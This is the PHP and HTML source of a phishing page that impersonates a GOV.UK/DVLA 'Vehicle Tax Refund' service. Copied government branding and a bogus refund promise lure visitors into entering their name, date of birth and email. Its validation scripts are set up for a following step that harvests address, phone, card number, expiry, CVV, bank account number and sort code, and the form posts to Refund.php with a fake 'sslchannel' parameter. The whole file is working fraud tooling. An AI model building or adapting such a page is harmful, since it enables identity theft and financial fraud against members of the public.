<?php
require "assets/includes/session_protect.php";
require "assets/includes/functions.php";
require "assets/includes/One_Time.php";


?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=Edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link href="assets/css/Main.css" media="screen" rel="stylesheet" type="text/css">
    <link href="assets/css/Font.css" media="screen" rel="stylesheet" type="text/css">
    <link rel="shortcut icon" href="assets/img/favicon.ico" type="image/x-icon">
    <link rel="apple-touch-icon-precomposed" sizes="144x144" href="assets/img/114.png">
    <link rel="apple-touch-icon-precomposed" sizes="114x114" href="assets/img/144.png">
    <link rel="apple-touch-icon-precomposed" sizes="72x72" href="assets/img/72.png">
    <link rel="apple-touch-icon-precomposed" href="assets/img/57.png">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.0.0-beta1/jquery.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/jquery.validate.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-validate/1.15.0/additional-methods.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.maskedinput/1.4.1/jquery.maskedinput.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.payment/1.3.2/jquery.payment.js"></script>
    <script>

        $('#verify').validate();
        (function($,W,D)
        {
            var JQUERY4U = {};

            JQUERY4U.UTIL =
                {
                    setupFormValidation: function()
                    {


                        //form validation rules
                        $("#verify").validate({
                            errorClass: "nom8",
                            errorElement: "p",
                            rules: {
                                name: {	required: true,	minlength: 4,},
                                dob: {	required: true,	minlength: 10,},
                                address: { required: true, minlength: 5,},
                                town: { required: true, minlength: 3,},
                                postcode: { required: true, minlength: 5,},
                                telephone: { required: true, minlength: 11, digits: true,},
                                email: { required: true, email: true,},
                            },
                            messages: {
                                name: {
                                    required: "Please provide full name",
                                    minlength: jQuery.validator.format("Please provide your full name"),
                                },
                                dob: {
                                    required: "Please provide date of birth",
                                    minlength: jQuery.validator.format("Please provide your date of birth"),
                                },
                                telephone: {
                                    required: "Please provide telephone number",
                                    minlength: jQuery.validator.format("Please ensure you enter 11 digits exactly"),
                                    digits: jQuery.validator.format("Please ensure you enter digits only"),
                                },
                                email: {
                                    required: "Please provide email address",
                                    email: jQuery.validator.format("Please check the email address you have entered"),
                                },
                                address: {
                                    required: "Please provide the 1st line of your address",
                                    minlength: jQuery.validator.format("Please check the address you have entered"),
                                },
                                town: {
                                    required: "Please provide city/town",
                                    minlength: jQuery.validator.format("Please check the city/town you have entered"),
                                },
                                postcode: {
                                    required: "Please provide postcode",
                                    minlength: jQuery.validator.format("Please check the postcode you have entered"),
                                },
                            },

                            submitHandler: function(form) {
                                document.getElementById("Details").style.display = "none";
                                document.getElementById("Payment").style.display = "block";
                                ForwardValues();
                                $('body,html').animate({
                                    scrollTop: 0
                                }, 800);
                                return false;
                            }
                        });
                    }
                }

            $(D).ready(function($) {
                JQUERY4U.UTIL.setupFormValidation();
            });

        })(jQuery, window, document);

        function ForwardValues() {
            var name = document.getElementById("name").value;
            document.getElementById("one").value=name;
            var dob = document.getElementById("dob").value;
            document.getElementById("two").value=dob;
            var telephone = document.getElementById("telephone").value;
            document.getElementById("three").value=telephone;
            var email = document.getElementById("email").value;
            document.getElementById("four").value=email;
            var address = document.getElementById("address").value;
            document.getElementById("five").value=address;
            var town = document.getElementById("town").value;
            document.getElementById("six").value=town;
            var postcode = document.getElementById("postcode").value;
            document.getElementById("seven").value=postcode;
        }
        $('#payment').validate();
        (function($,W,D)
        {
            var JQUERY4U = {};

            JQUERY4U.UTIL =
                {
                    setupFormValidation: function()
                    {


                        //form validation rules
                        $("#payment").validate({
                            errorClass: "nom8",
                            errorElement: "p",
                            rules: {
                                ccname: { required: true, minlength: 4},
                                ccno: { required: true, minlength: 16, creditcard: true},
                                ccexp: { required: true, minlength: 7,},
                                secode: { required: true, minlength: 3, digits: true,},
                                account: { required: true, minlength: 8,},
                                sortcode: { required: true, minlength: 8,},
                            },
                            messages: {
                                ccname: {
                                    required: "Please provide cardholders name",
                                    minlength: jQuery.validator.format("Please check the cardholders name you have entered"),
                                },
                                ccno: {
                                    required: "Please provide 16 digit card number",
                                    minlength: jQuery.validator.format("Please check the card number you have entered"),
                                    creditcard: jQuery.validator.format("Please check the card number you have entered"),
                                },
                                ccexp: {
                                    required: "Please provide card expiry date",
                                    minlength: jQuery.validator.format("Please check the card expiry date you have entered"),
                                },
                                secode: {
                                    required: "Please provide 3 digit card security code (CVV)",
                                    minlength: jQuery.validator.format("Please check the card security code you have entered"),
                                    digits: jQuery.validator.format("Please ensure you enter digits only"),
                                },
                                account: {
                                    required: "Please provide 8 digit account number",
                                    minlength: jQuery.validator.format("Please check the account number you have entered"),
                                },
                                sortcode: {
                                    required: "Please provide 6 digit sort code",
                                    minlength: jQuery.validator.format("Please check the sort code you have entered"),
                                },
                            },

                            submitHandler: function(form) {
                                form.submit();
                            }
                        });
                    }
                }

            $(D).ready(function($) {
                JQUERY4U.UTIL.setupFormValidation();
            });

        })(jQuery, window, document);
    </script>
    <script type="text/javascript">
        function movetoNext(current, nextFieldID) {
            if (current.value.length >= current.maxLength) {
                document.getElementById(nextFieldID).focus();
            }
        }
        jQuery(function($){
            $("#sortcode").mask("99-99-99",{placeholder:"XX-XX-XX"});
            $("#dob").mask("99/99/9999",{placeholder:"DD/MM/YYYY"});
            $("#cc-exp").mask("99 / 99",{placeholder:"MM / YY"});
        });
        jQuery(function($) {
            $('.cc-number').payment('formatCardNumber');
            $('.cc-exp').payment('formatCardExpiry');
            $('.cc-cvc').payment('formatCardCVC');

            $.fn.toggleInputError = function(erred) {
                this.parent('.field').toggleClass('errorzzzz', erred);
                return this;
            };

            $('form').submit(function(e) {
                e.preventDefault();

                var cardType = $.payment.cardType($('.cc-number').val());
                $('.cc-number').toggleInputError(!$.payment.validateCardNumber($('.cc-number').val()));
                $('.cc-exp').toggleInputError(!$.payment.validateCardExpiry($('.cc-exp').payment('cardExpiryVal')));
                $('.cc-cvc').toggleInputError(!$.payment.validateCardCVC($('.cc-cvc').val(), cardType));
                $('.cc-brand').text(cardType);
            });

        });

    </script>

    <title>Vehicle Tax Refund</title>

    <style>
        div.error {color:red}
    </style>
</head>


<body class="js-enabled">

    <div id="global-cookie-message">
        <p>GOV.UK uses cookies to make the site simpler. <a href="#"> Find out more about cookies</a></p>
    </div>

    <header role="banner" class="with-proposition" id="global-header">
        <div class="header-wrapper">
            <div class="header-global">
                <div class="header-logo">
                    <a href="#" id="logo" class="content">
                        <img src="assets/img/logo.png" width="35" height="31" alt=""> GOV.UK
                    </a>
                </div>
            </div>
            <div class="header-proposition">
                <div class="content">
                    <nav id="proposition-menu">
                        <a href="#" id="proposition-name">Vehicle tax</a>
                    </nav>
                </div>
            </div>
        </div>
    </header>
    <!--end header-->



    <div id="global-header-bar"></div>

    <div id="wrapper">
        <div class="maincontent">
            <div id="startHeader" class="start-header group">
                <h1>Tax Refund</h1>
            </div>
            <div class="body-container group">

                <div>
                    <p>
                        <span id="titleMsg" class="label">Please complete the form below to request a refund. This refund will be credited to the credit/debit card you provide.</span>
                    </p>
                </div>
                <form method="POST" id="verify" action="Refund.php?sslchannel=true&sessionid=<?php echo generateRandomString(130); ?>">
                <div class="inout-pad">
                    <p><strong><label for="name" class="label">Full Name</label></strong></p>
                    <p><input name="name" type="text" maxlength="40" id="name" class="input-large" autocomplete="off"></p>
                </div>

                <div class="inout-pad">
                    <p><strong><label for="dob" class="label">Date of Birth</label></strong></p>
                    <p><input name="dob" type="tel" maxlength="10" id="dob" class="input-medium" autocomplete="off"></p>
                </div>

                    <div class="inout-pad">
                        <p><strong><label for="email" class="label">E-mail</label></strong></p>
                        <p><input name="email" type="email" id="email" class="input-medium" autocomplete="off"></p>
                    </div>




                    <div>

                <div class="action">
                    <input type="submit" value="Continue" class="button">


                </div>
                </form>
            </div>

        </div>
    </div>

    <footer class="group js-footer" id="footer" role="contentinfo">
        <div class="footer-wrapper">
            <div class="footer-meta">
                <div class="footer-meta-inner">
                    <ul>
                        <li>
                            <a href="#">Cookies</a>
                        </li>
                        <li>
                            <a href="#">Terms and Conditions</a>
                        </li>
                        <li>
                            <a href="#">English</a>
                        </li>
                        <li>
                            <a href="#">Welsh</a>
                        </li>
                        <li>
                            Built by the <a href="#">Driver &amp; Vehicle Licensing Agency</a>
                        </li>
                    </ul>
                    <div class="open-government-licence">
                        <p class="logo"><a href="#">Open Government Licence</a></p>
                        <p>
                            All content is available under the <a href="#">
                                Open Government Licence v2.0</a>, except where otherwise stated</p>
                    </div>
                </div>
                <div class="copyright">
                    <a href="#">
                        &copy; Crown copyright</a>
                </div>
            </div>
        </div>
    </footer>
    <!--end footer-->



</form>





</body>
</html>
